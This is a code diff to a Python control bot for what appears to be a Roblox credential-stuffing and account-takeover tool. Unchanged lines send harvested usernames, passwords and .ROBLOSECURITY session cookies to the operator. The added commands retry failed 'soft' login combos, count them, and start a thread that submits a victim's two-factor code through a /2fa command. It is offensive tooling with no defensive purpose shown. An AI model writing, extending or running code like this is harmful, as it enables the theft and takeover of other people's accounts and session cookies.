@@ -179,6 +179,15 @@ class Bot:
                     h["username"], h["password"]))
             self.send("%s : %s\n\n.ROBLOSECURITY=%s" % (h["username"], h["password"],
                                                         h["cookie"]))
+        elif c == "/retryinvalid":
+            self.send("retry %d combo soft" % store.retry_soft())
+        elif c == "/soft":
+            self.send("soft=%d" % store.soft_count())
+        elif c == "/2fa":
+            if len(arg) < 2:
+                return self.send("pakai: /2fa <user> <kode>")
+            threading.Thread(target=self._do_2fa, args=(arg[0], arg[1]),
+                             daemon=True).start()
         elif c == "/dead":
             self.send("dead=%d\n%s" % (store.stats()["combos"].get("dead", 0),
                                        "\n".join(store.dead_list(int(arg[0]) if arg else 15))))
